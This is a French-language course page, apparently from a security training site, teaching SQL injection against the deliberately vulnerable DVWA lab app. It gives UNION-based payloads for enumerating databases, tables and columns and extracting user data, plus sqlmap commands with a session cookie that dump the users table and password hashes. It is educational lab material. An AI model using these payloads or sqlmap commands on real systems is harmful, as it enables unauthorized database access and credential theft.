          <li class="md-nav__item">
  <a href="#3-trouver-les-informations-sur-la-base-de-donnees" class="md-nav__link">
    <span class="md-ellipsis">
      3. Trouver les informations sur la base de données
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-faire-la-liste-des-tables" class="md-nav__link">
    <span class="md-ellipsis">
      4. Faire la liste des tables
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-faire-la-liste-des-champs-des-tables" class="md-nav__link">
    <span class="md-ellipsis">
      5. Faire la liste des champs des tables
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#extraction-de-donnees" class="md-nav__link">
    <span class="md-ellipsis">
      Extraction de données
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#utilisation-doutils-automatises-pour-linjection-sql" class="md-nav__link">
    <span class="md-ellipsis">
      Utilisation d'outils automatisés pour l'injection SQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Utilisation d'outils automatisés pour l'injection SQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#firefox" class="md-nav__link">
    <span class="md-ellipsis">
      Firefox
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    <span class="md-ellipsis">
      SQLMap
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#testez-vos-connaissances" class="md-nav__link">
    <span class="md-ellipsis">
      Testez vos connaissances
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="injections-sql">Injections SQL</h1>
<h2 id="notions-de-base">Notions de base</h2>
<p>Voici quelques notions de base avant de faire de l'injection SQL.  </p>
<h3 id="instructions-de-commentaires-dans-sqli">Instructions de commentaires dans SQLi</h3>
<p>Voici les différentes façons de commenter du code SQLi :  </p>
<table>
<thead>
<tr>
<th>Style</th>
<th>Nom</th>
</tr>
</thead>
<tbody>
<tr>
<td>--</td>
<td>MySQL sur linux</td>
</tr>
<tr>
<td>--+</td>
<td>MySQL sur Windows</td>
</tr>
<tr>
<td>#</td>
<td>Dièse</td>
</tr>
<tr>
<td>--+-</td>
<td>Commentaire SQL</td>
</tr>
<tr>
<td>;%00</td>
<td>Null</td>
</tr>
</tbody>
</table>
<h3 id="differentes-facons-dassigner-des-valeurs-dans-la-requete">Différentes façons d'assigner des valeurs dans la requête</h3>
<p>Une valeur peut être utilisée de 3 différentes façons :</p>
<p>Passage d'un integer : <code>select * from table where id=1</code></p>
<p>Passage d'une chaine de caractères avec l'apostrophe : <code>select * from table where id='1'</code></p>
<p>Passage d'une chaine de caractères avec le guillemet : <code>select * from table where id="1"</code></p>
<p>C'est important de découvrir quelle des trois techniques a été utilisée dans le code, pour bien injecter notre propre code.</p>
<h2 id="buts-de-linjection-sql">Buts de l'injection SQL</h2>
<p>Le but ultime de l'injection SQL et d'utiliser un champ d'une application Web et exécuter n'importe quelle instruction SQL.  </p>
<h2 id="reconnaissance-active">Reconnaissance active</h2>
<p>La première étape est la reconnaissance active. Dans ce contexte, ce sont ces étapes :  </p>
<ol>
<li>Déterminer le type d'assignation des valeurs dans la requête  </li>
<li>Déterminer le nombre de colonnes que la requête retourne  </li>
<li>Trouver les informations sur la base de données</li>
<li>Faire la liste des tables</li>
<li>Faire la liste des champs des tables</li>
</ol>
<h3 id="1-type-dassignation-des-valeurs">1. Type d'assignation des valeurs</h3>
<p>Voici l'interface de notre test :  </p>
<p><img alt="20-injection-interface" src="../../images/2020/07/20-injection-interface.png" /></p>
<p>Quand on entre un ID, l'interface retourne l'information.  </p>
<p>Voici les étapes pour tester quel type d'assignation est utilisé dans la requête SQL :  </p>
<p>Commencez par entrer <code>1'</code> (le chiffre 1 et l'apostrophe)</p>
<p>Si le résultat est une erreur ou une absence d'affichage, ce peut être une assignation <strong>integer</strong> ou <strong>apostrophe</strong>.</p>
<p><img alt="20-injection-erreur-sql" src="../../images/2020/07/20-injection-erreur-sql.png" /></p>
<p>Si le résultat est similaire à entrer un ID normal, c'est probablement <strong>guillemets</strong>.  </p>
<p>Voici les autres tests à faire :  </p>
<table>
<thead>
<tr>
<th>Entrée</th>
<th>integer</th>
<th>apostrophe</th>
<th>guillemets</th>
</tr>
</thead>
<tbody>
<tr>
<td>23'</td>
<td>Erreur</td>
<td>Erreur</td>
<td>OK</td>
</tr>
<tr>
<td>23"</td>
<td>Erreur</td>
<td>OK</td>
<td>Erreur</td>
</tr>
<tr>
<td>23 or 1=1</td>
<td>OK</td>
<td>Erreur</td>
<td>Erreur</td>
</tr>
<tr>
<td>23' or '1' = '1</td>
<td>Erreur</td>
<td>OK</td>
<td>Erreur</td>
</tr>
<tr>
<td>23" or "1" = "1</td>
<td>Erreur</td>
<td>Erreur</td>
<td>OK</td>
</tr>
</tbody>
</table>
<p>Maintenant, il faut tester si l'assignation se fait entre parenthèse, par exemple :  </p>
<p><code>select * from table where id=(1)</code>  </p>
<p>Si c'est une assignation <strong>integer</strong>, faire les tests suivants :  </p>
<table>
<thead>
<tr>
<th>Entrée</th>
<th>Remarque</th>
</tr>
</thead>
<tbody>
<tr>
<td>1 #</td>
<td>Si OK, pas de parenthèses</td>
</tr>
<tr>
<td>1) #</td>
<td>Si OK, utilise les parenthèses</td>
</tr>
</tbody>
</table>
<p>Si c'est une assignation <strong>apostrophes</strong>, faire les tests suivants :  </p>
<table>
<thead>
<tr>
<th>Entrée</th>
<th>Remarque</th>
</tr>
</thead>
<tbody>
<tr>
<td>1' #</td>
<td>Si OK, pas de parenthèses</td>
</tr>
<tr>
<td>1') #</td>
<td>Si OK, utilise les parenthèses</td>
</tr>
</tbody>
</table>
<p>Si c'est une assignation <strong>guillemets</strong>, faire les tests suivants :  </p>
<table>
<thead>
<tr>
<th>Entrée</th>
<th>Remarque</th>
</tr>
</thead>
<tbody>
<tr>
<td>1" #</td>
<td>Si OK, pas de parenthèses</td>
</tr>
<tr>
<td>1") #</td>
<td>Si OK, utilise les parenthèses</td>
</tr>
</tbody>
</table>
<h3 id="2-determiner-le-nombre-de-colonnes">2. Déterminer le nombre de colonnes</h3>
<p>Pour déterminer le nombre de colonnes de la requête SQL, nous allons utiliser la fonction ORDER BY.  </p>
<p>Prenez cette requête :  </p>
<p><code>Select nom, prenom from etudiants order by 1</code>  </p>
<p>Cette requête retournera la liste des étudiants triée par nom.</p>
<p><code>Select nom, prenom from etudiants order by 2</code>  </p>
<p>Cette requête retournera la liste des étudiants triée par prénom.</p>
<p><code>Select nom, prenom from etudiants order by 3</code>  </p>
<p>Cette requête retournera une erreur, la colonne 3 n'existe pas.</p>
<p>Sachant ce comportement, injectons ceci :  </p>
<table>
<thead>
<tr>
<th>Assignation</th>
<th>Entrée</th>
</tr>
</thead>
<tbody>
<tr>
<td>Integer</td>
<td>1 ORDER BY 1 #</td>
</tr>
<tr>
<td>Apostrophe</td>
<td>1' ORDER BY 1 #</td>
</tr>
<tr>
<td>Guillemets</td>
<td>1" ORDER BY 1 #</td>
</tr>
</tbody>
</table>
<p>Ensuite  :  </p>
<table>
<thead>
<tr>
<th>Assignation</th>
<th>Entrée</th>
</tr>
</thead>
<tbody>
<tr>
<td>Integer</td>
<td>1 ORDER BY 2 #</td>
</tr>
<tr>
<td>Apostrophe</td>
<td>1' ORDER BY 2 #</td>
</tr>
<tr>
<td>Guillemets</td>
<td>1" ORDER BY 2 #</td>
</tr>
</tbody>
</table>
<p>Et ainsi de suite, jusqu'à obtention d'une erreur.  </p>
<h3 id="3-trouver-les-informations-sur-la-base-de-donnees">3. Trouver les informations sur la base de données</h3>
<p>La technique pour trouver les informations sur la base de données et tout autre données est l'utilisation de l'instruction UNION.  </p>
<p>L'instruction UNION permet de combiner la sortie de deux requêtes SQL en une seule, tant et aussi longtemps qu'elles ont le même nombre de colonnes.  </p>
<p>Prenons l'instruction suivante :  </p>
<p><code>Select nom, prenom from etudiants where id = 1</code></p>
<p>Cette requête retourne ceci :  </p>
<table>
<thead>
<tr>
<th>Nom</th>
<th>Prénom</th>
</tr>
</thead>
<tbody>
<tr>
<td>George</td>
<td>Lemieux</td>
</tr>
</tbody>
</table>
<p><code>Select nom, prenom from etudiants where id = 2</code></p>
<p>Cette requête retourne ceci :  </p>
<table>
<thead>
<tr>
<th>Nom</th>
<th>Prénom</th>
</tr>
</thead>
<tbody>
<tr>
<td>Lucien</td>
<td>Poirier</td>
</tr>
</tbody>
</table>
<p>Si nous faisons l'union de ces deux requêtes :  </p>
<p><code>Select nom, prenom from etudiants where id = 1 UNION Select nom, prenom from etudiants where id = 2</code></p>
<p>Cette requête retourne ceci :  </p>
<table>
<thead>
<tr>
<th>Nom</th>
<th>Prénom</th>
</tr>
</thead>
<tbody>
<tr>
<td>George</td>
<td>Lemieux</td>
</tr>
<tr>
<td>Lucien</td>
<td>Poirier</td>
</tr>
</tbody>
</table>
<p>Donc, dans notre injection, nous allons faire des UNION pour extraire l'information de la base de données.  </p>
<p>Premier test d'UNION :</p>
<p><code>1 UNION SELECT 1,2 #</code>  </p>
<p>Devrait retourner ceci :  </p>
<p><img alt="20-injection-select-1-2" src="../../images/2020/07/20-injection-select-1-2.png" /></p>
<p>Maintenant, allons chercher l'information de la base de donnée :  </p>
<p><code>1 UNION SELECT null, database() #</code></p>
<p>Notez que pour respecter le nombre de colonnes, null est ajouté à la place de colonnes qui ne sont pas utiles dans la requête à injecter.  </p>
<p>La requête retourne ceci :  </p>
<p><img alt="20-injection-select-database" src="../../images/2020/07/20-injection-select-database.png" /></p>
<p>La version de la BD :  </p>
<p><code>1 UNION SELECT null, version() #</code></p>
<p>Retourne ceci :  </p>
<p><img alt="20-injection-select-version" src="../../images/2020/07/20-injection-select-version.png" /></p>
<p>L'utilisateur que se sert l'application pour exécuter les requêtes SQL :  </p>
<p><code>1 UNION SELECT null, user() #</code></p>
<p>Retourne ceci :  </p>
<p><img alt="20-injection-select-user" src="../../images/2020/07/20-injection-select-user.png" /></p>
<h3 id="4-faire-la-liste-des-tables">4. Faire la liste des tables</h3>
<p>Pour faire la liste des tables, il suffit de faire une requête dans le schéma d'information (ceci est pour MySQL) :  </p>
<p><code>1 UNION Select null, table_name from information_schema.tables #</code>  </p>
<p><img alt="20-injection-select-schema-tables" src="../../images/2020/07/20-injection-select-schema-tables.png" /></p>
<p>Pour chercher une table avec un nom particulier, on peut filtrer comme ceci :  </p>
<p><code>1 UNION Select null, table_name from information_schema.tables where table_name like 'u%' #</code>  </p>
<p><img alt="11-injection-select-schema-table-where-u" src="../../images/2020/07/11-injection-select-schema-table-where-u.png" /></p>
<h3 id="5-faire-la-liste-des-champs-des-tables">5. Faire la liste des champs des tables</h3>
<p>Pour faire la liste des tables, il suffit de faire une requête dans le schéma d'information (ceci est pour MySQL) :  </p>
<p><code>1 UNION Select table_name, column_name from information_schema.columns where table_name = 'users' #</code>  </p>
<p><img alt="20-injection-select-columns-schema-table-users" src="../../images/2020/07/20-injection-select-columns-schema-table-users.png" />   </p>
<h2 id="extraction-de-donnees">Extraction de données</h2>
<p>Essayons d'extraire la liste des utilisateurs de la base de données :  </p>
<p><code>1 UNION Select null, concat(0x0a,'USER ID: ',user_id, 0x0a, 'First name: ', first_name, 0x0a, 'Last name: ', last_name ) from users #</code>  </p>
<p>Truc:  <code>0x0a</code> et le caractère de retour de chariot, permet d'afficher sur plusieurs lignes nos résultats...</p>
<p><img alt="20-injection-select-users" src="../../images/2020/07/20-injection-select-users.png" /></p>
<h2 id="utilisation-doutils-automatises-pour-linjection-sql">Utilisation d'outils automatisés pour l'injection SQL</h2>
<p>Pour notre prochain test, nous allons utiliser deux outils :</p>
<ol>
<li>Firefox : pour capturer les témoins  </li>
<li>SQLMap : pour automatiser l'injection SQL    </li>
</ol>
<h3 id="firefox">Firefox</h3>
<p>Nous voulons extraire les témoins de la page Web de DVWA car les témoins contiendrons les informations de la session PHP qui est créée lors du login. SQLMap ne peut se loguer lui-même, mais peut utiliser les témoins.</p>
<p>1 - Dans les outils développeur de Firefox, ouvrir le stockage des témoins:  </p>
<p><img alt="20-firefox-cookies" src="../../images/2020/11/20-firefox-cookies.png" /></p>
<p>Nous avons maintenant le témoin pour utiliser SQLMap.</p>
<h3 id="sqlmap">SQLMap</h3>
<p>SQLMap est un outil pour automatiser l'injection SQL.  C'est un outil en ligne de commande.</p>
<p>Pour déterminer les bases de données accessibles via l'injection SQL :  </p>
<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
  --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \
  -dbs
</code></pre>
<p>Résultat :  </p>
<p><img alt="20-sqlmap-dbs" src="../../images/2020/07/20-sqlmap-dbs.png" />  </p>
<p>Pour déterminer les tables d'une base de données :  </p>
<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
  --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \  
  -D dvwa -tables
</code></pre>
<p>Résultat :  </p>
<p><img alt="20-sqlmap-tables" src="../../images/2020/07/20-sqlmap-tables.png" /></p>
<p>Pour extraire la table users :  </p>
<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
  --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \
  -D dvwa -T users -dump
</code></pre>
<p>SQLMap automatise l'extraction des mots de passe. Voici les réponses aux questions pour ce faire :  </p>
<p><img alt="20-sqlmap-reponses-passwords" src="../../images/2020/07/20-sqlmap-reponses-passwords.png" /></p>
<p>Résultat :  </p>
<p><img alt="20-sqlmap-users-table" src="../../images/2020/07/20-sqlmap-users-table.png" /></p>
<p>Pour extraire les utilisateurs de la DBMS :  </p>
<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
  --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \  
  --string=”Surname” –users –password
</code></pre>
<p>Résultat :  </p>
<p><img alt="20-sqlmap-dbms-users" src="../../images/2020/07/20-sqlmap-dbms-users.png" /></p>
<p>On peut voir que les champs de mot de passe sont NULL, ce qui veut dire qu'il n'y a pas de mot de passe pour les utilisateurs...</p>
<p>Testons-le en se connectant à mysql :  </p>
<p><img alt="20-mysql-login-root" src="../../images/2020/07/20-mysql-login-root.png" /></p>
<p>Et voilà!</p>
<div class="admonition important">
<p class="admonition-title">Important</p>
<p>Prenez quelques minutes pour faire votre <a href="../../outils/cartographie/">cartographie</a> de la leçon d'aujourd'hui!   </p>
</div>
<h2 id="testez-vos-connaissances">Testez vos connaissances</h2>
<p><a href="https://forms.office.com/r/6ZettJa66y">Petit quiz sur l'injection SQL</a>  </p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
      
        <script src="../../javascript/linktarget.js"></script>
      
        <script src="../../javascript/addTranslations.js"></script>
      
    
  </body>
</html>